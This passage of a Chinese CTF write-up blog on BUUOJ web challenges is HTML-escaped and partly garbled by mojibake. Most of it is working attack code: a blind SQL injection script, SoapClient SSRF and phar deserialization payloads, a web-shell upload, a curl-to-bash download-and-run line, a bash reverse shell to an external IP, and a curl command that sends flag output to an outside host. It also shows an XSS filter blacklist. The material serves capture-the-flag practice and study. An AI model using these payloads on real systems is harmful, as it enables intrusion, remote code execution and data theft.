time</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;cfa4fe25-3f41-4b51-94cc-ffb813030907.node3.buuoj.cn&#x2F;index.php?action&#x3D;publish&#39;</span><br><span class="line">cookies &#x3D; &#123;</span><br><span class="line">    &quot;PHPSESSID&quot;: &quot;609p5gi14cubaulus8h2vh3rj1&quot;   #å…ˆç™»é™†ï¼Œç„¶åæ¢cookie</span><br><span class="line">&#125;</span><br><span class="line">text&#x3D;&#39;&#39;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">    l&#x3D;28</span><br><span class="line">    h&#x3D;126</span><br><span class="line">    while abs(h - l) &gt; 1:</span><br><span class="line">        mid&#x3D;(l+h)&#x2F;2</span><br><span class="line">        payload&#x3D;&#39;c&#96;,if(((ascii(mid((select password from ctf_users limit 1),&#123;&#125;,1)))&gt;&#123;&#125;),sleep(3),1))#&#39;</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &#39;signature&#39;:payload.format(i,mid),</span><br><span class="line">            &#39;mood&#39;:0</span><br><span class="line">        &#125;</span><br><span class="line">        now_t&#x3D;time.time()</span><br><span class="line">        re&#x3D;requests.post(url,data&#x3D;data,cookies&#x3D;cookies)</span><br><span class="line">        #print(re.text)</span><br><span class="line">        if time.time()-now_t &gt; 3:</span><br><span class="line">            l&#x3D;mid</span><br><span class="line">        else:</span><br><span class="line">            h&#x3D;mid</span><br><span class="line">    mid_num &#x3D; int((l+h+1) &#x2F; 2)</span><br><span class="line">    text +&#x3D; chr(int(h))</span><br><span class="line">    print(text)</span><br></pre></td></tr></table></figure><ol start="3"><li>å¾—åˆ°MD5:c991707fdf339958eded91331fb11ba0,è§£å¾—jaivypasswordï¼Œå°è¯•è¿›è¡Œç™»å½•å‘ç°é¡µé¢å›æ˜¾<code>You can only login at the usual address</code>ï¼Œåœ¨æºä»£ç åŒ…å…¨å±€æœç´¢è¿™ä¸€å­—ç¬¦ä¸²ï¼Œåœ¨user.phpå¤„æ‰¾åˆ°</li></ol><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200327104310957.png" alt></p><p>åˆ†æä»£ç å¯çŸ¥$userçš„å€¼æ¥æºäº$ret</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$ret &#x3D; $db-&gt;select(array(&#39;id&#39;,&#39;username&#39;,&#39;ip&#39;,&#39;is_admin&#39;,&#39;allow_diff_ip&#39;),&#39;ctf_users&#39;,&quot;username &#x3D; &#39;$username&#39; and password &#x3D; &#39;$password&#39; limit 1&quot;);</span><br></pre></td></tr></table></figure><p>get_ipæ˜¯ç”±$_SERVER[â€™â€˜REMOTE_ADDRâ€™]è·å¾—çš„ï¼Œéœ€è¦ssrf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function get_ip()&#123;</span><br><span class="line">    return $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨use.phpçš„showmessæ–¹æ³•ä¸­æ‰¾åˆ°ååºåˆ—åŒ–å‡½æ•°</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200327222624765.png" alt></p><p>è¿™é‡Œçš„row[2]ï¼Œä¸ºä¸Šé¢selectæŸ¥è¯¢ä¸­çš„moodå­—æ®µå€¼ã€‚SSRF+ååºåˆ—åŒ–ï¼ŒSSRFå¯ç”¨ä½¿ç”¨å†…ç½®ç±»Soapclientï¼Œå¹¶ä¸”ä¸‹é¢è¿˜è°ƒç”¨äº†ä¸€ä¸ªgetcountryçš„è‡ªå®šä¹‰æ–¹æ³•ï¼Œæ­£å¥½å¯ç”¨è§¦å‘Soapclient::__callè¿›è¡Œç½‘ç»œè¯·æ±‚</p><p>æ–°å»ºä¸€ä¸ªçª—å£,æ›¿æ¢payloadä¸­çš„cookieå’Œçˆ†ç ´åçš„code</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328000047237.png" alt></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?action&#x3D;login&quot;;</span><br><span class="line">$post_string &#x3D; &#39;username&#x3D;admin&amp;password&#x3D;jaivypassword&amp;code&#x3D;113713&#39;;&#x2F;&#x2F;æ¢code</span><br><span class="line">$headers &#x3D; array(</span><br><span class="line">    &#39;Cookie: PHPSESSID&#x3D;u1umj91lggqgj0ccibd81h3d91&#39;,&#x2F;&#x2F;æ¢cookie</span><br><span class="line">);</span><br><span class="line">$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;w4nder^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;. (string)strlen($post_string).&#39;^^^^&#39;.$post_string.&#39;^^&#39;,&#39;uri&#39;&#x3D;&gt;&#39;hello&#39;));</span><br><span class="line">$aaa &#x3D; serialize($b);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);</span><br><span class="line">echo &#39;0x&#39;.bin2hex($aaa);</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸€ä¸‹å¾—åˆ°åºåˆ—åŒ–çš„hexå€¼ï¼Œåœ¨ä¹‹å‰ç™»é™†çš„test123è´¦å·ä¸Šæ³¨å…¥moodçš„å€¼</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328000906716.png" alt></p><p>ç”¨test123è´¦å·è´¦å·åˆ·æ–°ä¸€ä¸‹<code>?action=index</code>çš„é¡µé¢ï¼Œè§¦å‘å‘åºåˆ—åŒ–ï¼Œç„¶ååˆ·æ–°æ–°å¼€çš„çª—å£é¡µé¢å‘ç°publishå˜æˆäº†æ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹‹æ‰€ä»¥ååºåˆ—åŒ–soapç±»åèƒ½ç™»å½•adminï¼Œæ˜¯å› ä¸º</p><pre><code>$mood = unserialize($row[2]);$country = $mood-&gt;getcountry();</code></pre><p>æˆ‘ä»¬çŸ¥é“æ­¤æ—¶$moodå°±æ˜¯ä¸€ä¸ªsoapç±»ï¼Œæ‰€ä»¥è¿™ä¸ªç±»æ²¡æœ‰getcountry()æ–¹æ³•ï¼Œæ­¤æ—¶å°±ä¼šè§¦å‘soapç±»çš„__call()é­”æ³•å‡½æ•°å°±èƒ½å®ç°ç™»å½•<br>ä¸Šä¼ ä¸€ä¸ªå°é©¬ï¼Œè¿æ¥èšå‰‘ï¼ŒæŸ¥çœ‹/etc/hostï¼Œå‘ç°å­˜åœ¨173.208.161.0/24çš„ç½‘æ®µï¼Œé€ä¸ªcurl æ‰«æï¼Œå‘ç°173.208.161.10å­˜æ´»</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89%5Cimage-20200328002224576.png" alt></p><p>åœ¨burpä¸­æŸ¥çœ‹æºä»£ç è¿›è¡Œåˆ†æ</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328002753590.png" alt></p><p>ç”±äºendä¼šè¾“å‡ºè¾“å…¥çš„æœ€åä¸€é¡¹å€¼ï¼Œå¦‚æœ$ext==$filename[count($filename) - 1]ï¼Œdie()ï¼Œ$filenameå¯ä»¥ç›´æ¥ä¼ å…¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¼ ä¸ªfile[0]ä¸file[1]ï¼Œé—®é¢˜åœ¨äºend()ï¼Œend()è¿”å›æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œä½†å¹¶ä¸æ˜¯æŒ‰ç…§æ•°ç»„ç´¢å¼•çš„é¡ºåºæ’åˆ—çš„ï¼Œè€Œæ˜¯æŒ‰ç…§èµ‹å€¼é¡ºåºã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥file[1]=aaa,file[0]=bbbï¼Œæ–‡ä»¶åä¸ºbbb.aaaï¼Œend()è¿”å›çš„æ˜¯bbbï¼Œç¬¬ä¸€ä¸ªdieå°±å¯ä»¥ç»•è¿‡äº†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200306171314880.png" alt></p><p>ä¸Šä¼ æºä»£ç ï¼Œç”¨postmanå‘åŒ…</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328011427281.png" alt></p><p>ç”¨codeåŠŸèƒ½è½¬æ¢æˆphp_cURLä»£ç ï¼Œä¿®æ”¹urlå’Œè¯·æ±‚ä½“</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328012415117.png" alt></p><p>ç”Ÿæˆæœ€ç»ˆpayloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$curl &#x3D; curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt_array($curl, array(</span><br><span class="line">  CURLOPT_URL &#x3D;&gt; &quot;http:&#x2F;&#x2F;173.184.57.10&quot;,</span><br><span class="line">  CURLOPT_RETURNTRANSFER &#x3D;&gt; true,</span><br><span class="line">  CURLOPT_ENCODING &#x3D;&gt; &quot;&quot;,</span><br><span class="line">  CURLOPT_MAXREDIRS &#x3D;&gt; 10,</span><br><span class="line">  CURLOPT_TIMEOUT &#x3D;&gt; 30,</span><br><span class="line">  CURLOPT_HTTP_VERSION &#x3D;&gt; CURL_HTTP_VERSION_1_1,</span><br><span class="line">  CURLOPT_CUSTOMREQUEST &#x3D;&gt; &quot;POST&quot;,</span><br><span class="line">  CURLOPT_POSTFIELDS &#x3D;&gt; &quot;------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;file\&quot;; filename&#x3D;\&quot;shell.php\&quot;\r\nContent-Type: false\r\n\r\n@&lt;?php system(&#39;cat &#x2F;etc&#x2F;flag*&#39;);\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;hello\&quot;\r\n\r\nshell.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;file[2]\&quot;\r\n\r\n222\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;file[1]\&quot;\r\n\r\n111\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;file[0]\&quot;\r\n\r\n&#x2F;..&#x2F;shell.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--&quot;,</span><br><span class="line">  CURLOPT_HTTPHEADER &#x3D;&gt; array(</span><br><span class="line">    &quot;cache-control: no-cache&quot;,</span><br><span class="line">    &quot;content-type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary7MA4YWxkTrZu0gW&quot;,</span><br><span class="line">    &quot;postman-token: 09101c1a-04aa-7288-15ea-515cbc9c512b&quot;</span><br><span class="line">  ),</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$response &#x3D; curl_exec($curl);</span><br><span class="line">$err &#x3D; curl_error($curl);</span><br><span class="line"></span><br><span class="line">curl_close($curl);</span><br><span class="line"></span><br><span class="line">if ($err) &#123;</span><br><span class="line">  echo &quot;cURL Error #:&quot; . $err;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è®¿é—®å¾—åˆ°flagï¼š</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328012625101.png" alt></p><p>æœ€ååæ§½ä¸€ä¸‹å®¹å™¨ç»å¸¸ä¼šæ³¨å†Œå¤±è´¥ï¼Œéœ€è¦é”€æ¯é‡å¯QAQ</p><p>å‚è€ƒé“¾æ¥ï¼š</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/104687766" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104687766</a></p><p><a href="https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/web/ShellShellShell/README_zh.md" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/web/ShellShellShell/README_zh.md</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/104132751?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104132751?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p></blockquote><h3 id="0x-03-SUCTF-2019-Upload-Labs-2"><a href="#0x-03-SUCTF-2019-Upload-Labs-2" class="headerlink" title="0x 03 [SUCTF 2019]Upload Labs 2"></a>0x 03 [SUCTF 2019]Upload Labs 2</h3><ul><li><p>è€ƒç‚¹</p><p>pharååºåˆ—åŒ–ã€SSRF</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li><p>é¦–å…ˆæ ¹æ®é¢˜ç›®æä¾›çš„æºä»£ç è¿›è¡Œå®¡è®¡ï¼Œå‘ç°è¦è·å¾—flagå¿…é¡»æœ¬åœ°è®¿é—®admin.phpï¼Œè¿™é‡Œéœ€è¦è¿›è¡ŒSSRFï¼Œè¿™é‡Œå°†ä¼ é€’åˆ°admin.phpçš„å‚æ•°è¿›è¡Œå®ä¾‹åŒ–äº†ADç±»ï¼Œåœ¨è¿™ä¸ªç±»ä¸­ï¼Œåˆé€šè¿‡åå°„ç±»æ¥å®ä¾‹ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶é€šè¿‡è¯¥å®ä¾‹åŒ–çš„å¯¹è±¡æ¥è°ƒç”¨åå°„å‡ºæ¥çš„è¯¥ç±»çš„æ–¹æ³•</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328115740615.png" alt></p><p>åˆ†æindex.phpä»£ç å‘ç°å®ƒå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥ï¼Œæ£€æŸ¥å›¾ç‰‡çš„åç¼€å’Œä¸Šä¼ çš„å†…å®¹ä¸­ä¸èƒ½æœ‰<code>&lt;?</code>ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨<code>&lt;script language=&#39;php&#39;&gt;</code>ç»•è¿‡ã€‚</p></li><li><p>åˆ†æfunc.phpä¸­çš„ä»£ç ï¼Œå¯¹postè¯·æ±‚çš„urlå‚æ•°è¿›è¡ŒåŒ¹é…</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#39;&#x2F;^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*&#x2F;i&#39;,$_POST[&#39;url&#39;]))&#123;</span><br><span class="line">        die(&quot;Go away!&quot;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/index.png" alt></p><p>è¿™é‡Œè¿‡æ»¤äº†è¿‡æ»¤äº†ç±»ä¼¼<code>phar</code>ä¹‹ç±»çš„ä¼ªåè®®ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ php://filter æ¥ç»•è¿‡ä¸€äº›å¼€å¤´é™åˆ¶è¿›è¡Œ phar ååºåˆ—åŒ–ã€‚</p><p>è¿™é‡Œä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥ï¼Œè¿”å›æ–‡ä»¶ç±»å‹ï¼Œå¯èƒ½å­˜åœ¨pharååºåˆ—åŒ–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file_path &#x3D; $_POST[&#39;url&#39;];</span><br><span class="line">$file &#x3D; new File($file_path);</span><br><span class="line">$file-&gt;getMIME();</span><br><span class="line">echo &quot;&lt;p&gt;Your file type is &#39;$file&#39; &lt;&#x2F;p&gt;&quot;;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›Fileç±»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class File&#123;</span><br><span class="line">...</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        &#x2F;&#x2F;è°ƒç”¨åå°„åˆ›å»ºç±»</span><br><span class="line">        $class &#x3D; new ReflectionClass($this-&gt;func);</span><br><span class="line">        &#x2F;&#x2F;åˆ›å»ºå®ä¾‹</span><br><span class="line">        $a &#x3D; $class-&gt;newInstanceArgs($this-&gt;file_name);</span><br><span class="line">         &#x2F;&#x2F;è§¦å‘SoapClientç±»çš„__callæ–¹æ³•</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getMIME()&#123;</span><br><span class="line">        $finfo &#x3D; finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        $this-&gt;type &#x3D; finfo_file($finfo, $this-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>$hits-&gt;func</code>å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ä¸º<code>SoapClient</code>ç±»ï¼Œç„¶åæ§åˆ¶<code>$htis-&gt;file_name</code>å»ä¼ å…¥æˆ‘ä»¬æƒ³è¦çš„å‚æ•°ã€‚æœ€åé€šè¿‡<code>$a-&gt;check();</code>è°ƒç”¨<code>SoapClient::__call()</code>ä»è€Œè§¦å‘<code>SSRF</code></p><ol start="3"><li>æ„é€ payloadå¦‚ä¸‹ï¼š</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    public $file_name &#x3D; &quot;&quot;;</span><br><span class="line">    public $func &#x3D; &quot;SoapClient&quot;;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php&quot;;</span><br><span class="line">        &#x2F;&#x2F;éœ€è¦æ›´æ”¹å…¶ä¸­curl çš„ip</span><br><span class="line">        $post_string &#x3D; &#39;admin&#x3D;&amp;cmd&#x3D;curl 174.1.145.112&#x2F;index.php|bash&amp;clazz&#x3D;SplStack&amp;func1&#x3D;push&amp;func2&#x3D;push&amp;func3&#x3D;push&amp;arg1&#x3D;1111&amp;arg2&#x3D;1111&amp;arg3&#x3D;&#39; . &quot;\r\n&quot;;</span><br><span class="line">        $headers &#x3D; [];</span><br><span class="line">        $this-&gt;file_name &#x3D; [</span><br><span class="line">            null,</span><br><span class="line">            array(&#39;location&#39; &#x3D;&gt; $target,</span><br><span class="line">                &#39;user_agent&#39; &#x3D;&gt; str_replace(&#39;^^&#39;, &quot;\r\n&quot;, &#39;xxxxx^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39; . join(&#39;^^&#39;, $headers) . &#39;Content-Length: &#39; . (string)strlen($post_string) . &#39;^^^^&#39; . $post_string),</span><br><span class="line">                &#39;uri&#39; &#x3D;&gt; &#39;hello&#39;)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar &#x3D; new Phar(&#39;test.phar&#39;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;text&#39;);</span><br><span class="line">$phar-&gt;setStub(&#39;&lt;script language&#x3D;&quot;php&quot;&gt;__HALT_COMPILER();&lt;&#x2F;script&gt;&#39;);</span><br><span class="line">$object &#x3D; new File;</span><br><span class="line">echo urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(&#39;test.phar&#39;,&#39;lanxiaojun.jpg&#39;);</span><br></pre></td></tr></table></figure><p>è¿è¡Œç”Ÿæˆäº†ä¸€ä¸ªlanxiaojun.jpgæ–‡ä»¶å¹¶ä¸Šä¼ </p><p>æ˜¯çš„</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328113640002.png" alt></p><p>åœ¨linuxä¸‹é¶æœºçš„åœ¨<code>var/www/html/index.php</code>ä¸­å†™å…¥å¼¹shellçš„ä¸€å¥è¯ï¼Œå¹¶å¼€å¯ç›‘å¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.145.112&#x2F;9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>åœ¨func.phpé¡µé¢è§¦å‘ååºåˆ—åŒ–</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328120255257.png" alt></p><p>ç„¶ååœ¨é¶æœºä¸Šæ”¶åˆ°åå¼¹çš„shellè·å¾—flagã€‚</p><p>é™¤äº†å¯ä»¥åå¼¹shellä¹‹å¤–è¿˜å¯ä»¥å‘åŒ…å¸¦ä¸Šè¯·æ±‚çš„ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$post_string &#x3D; &#39;admin&#x3D;1&amp;cmd&#x3D;curl --referer &quot;&#96;&#x2F;readflag&#96;&quot; &quot;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api%26id&#x3D;72Jvrh&quot;&amp;clazz&#x3D;SplStack&amp;func1&#x3D;push&amp;func2&#x3D;push&amp;func3&#x3D;push&amp;arg1&#x3D;123456&amp;arg2&#x3D;123456&amp;arg3&#x3D;&#39;. &quot;\r\n&quot;;</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥ï¼š</p><blockquote><p><a href="http://github.mrkaixin.computer/2020/03/16/BUU(ä¸‰)/" target="_blank" rel="noopener">http://github.mrkaixin.computer/2020/03/16/BUU(%E4%B8%89)/</a></p><p><a href="https://www.jianshu.com/p/b97080cd7623" target="_blank" rel="noopener">https://www.jianshu.com/p/b97080cd7623</a></p></blockquote><h3 id="0x-04-GWCTF-2019-mypassword"><a href="#0x-04-GWCTF-2019-mypassword" class="headerlink" title="0x 04 [GWCTF 2019]mypassword"></a>0x 04 [GWCTF 2019]mypassword</h3><ul><li><p>è€ƒç‚¹</p><p>xss</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>æ³¨å†Œç™»å½•ä¹‹ååœ¨feedback`é¡µé¢çœ‹åˆ°äº†ä¸€ä¸ªå¤§å¤§çš„è¾“å…¥æ¡†ï¼ŒæŸ¥çœ‹æºç å¦‚ä¸‹ï¼š</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(is_array($feedback))&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&#39;åé¦ˆä¸åˆæ³•&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">$blacklist &#x3D;[&#39;_&#39;,&#39;\&#39;&#39;,&#39;&amp;&#39;,&#39;\\&#39;,&#39;#&#39;,&#39;%&#39;,&#39;input&#39;,&#39;script&#39;,&#39;iframe&#39;,&#39;host&#39;,&#39;onload&#39;,&#39;onerror&#39;,&#39;srcdoc&#39;,&#39;location&#39;,&#39;svg&#39;,&#39;form&#39;,&#39;img&#39;,&#39;src&#39;,&#39;getElement&#39;,&#39;document&#39;,&#39;cookie&#39;];</span><br><span class="line">foreach ($blacklist as $val) &#123;</span><br><span class="line">while(true)&#123;</span><br><span class="line">if(stripos($feedback,$val) !&#x3D;&#x3D; false)&#123;</span><br><span class="line">    $feedback &#x3D; str_ireplace($val,&quot;&quot;,$feedback);</span><br><span class="line">&#125;</span><br><span class="line">        else&#123;</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜å­˜åœ¨<code>CSP</code>ï¼Œä¸èƒ½æ³¨å…¥å¤–éƒ¨çš„JSï¼Œé‚£è‚¯å®šå°±éœ€è¦åœ¨å†…éƒ¨JSä¸ŠåŠ¨æ‰‹è„šï¼Œé€ä¸ªé¡µé¢çœ‹æºç ï¼Œç»“æœåœ¨ç™»é™†é¡µé¢çœ‹åˆ°å­˜åœ¨<code>login.js</code>ï¼Œæºç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (document.cookie &amp;&amp; document.cookie !&#x3D; &#39;&#39;) &#123;</span><br><span class="line">var cookies &#x3D; document.cookie.split(&#39;; &#39;);</span><br><span class="line">var cookie &#x3D; &#123;&#125;;</span><br><span class="line">for (var i &#x3D; 0; i &lt; cookies.length; i++) &#123;</span><br><span class="line">var arr &#x3D; cookies[i].split(&#39;&#x3D;&#39;);</span><br><span class="line">var key &#x3D; arr[0];</span><br><span class="line">cookie[key] &#x3D; arr[1];</span><br><span class="line">&#125;</span><br><span class="line">if(typeof(cookie[&#39;user&#39;]) !&#x3D; &quot;undefined&quot; &amp;&amp; typeof(cookie[&#39;psw&#39;]) !&#x3D; &quot;undefined&quot;)&#123;</span><br><span class="line">document.getElementsByName(&quot;username&quot;)[0].value &#x3D; cookie[&#39;user&#39;];</span><br><span class="line">document.getElementsByName(&quot;password&quot;)[0].value &#x3D; cookie[&#39;psw&#39;];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè®°ä½å¯†ç 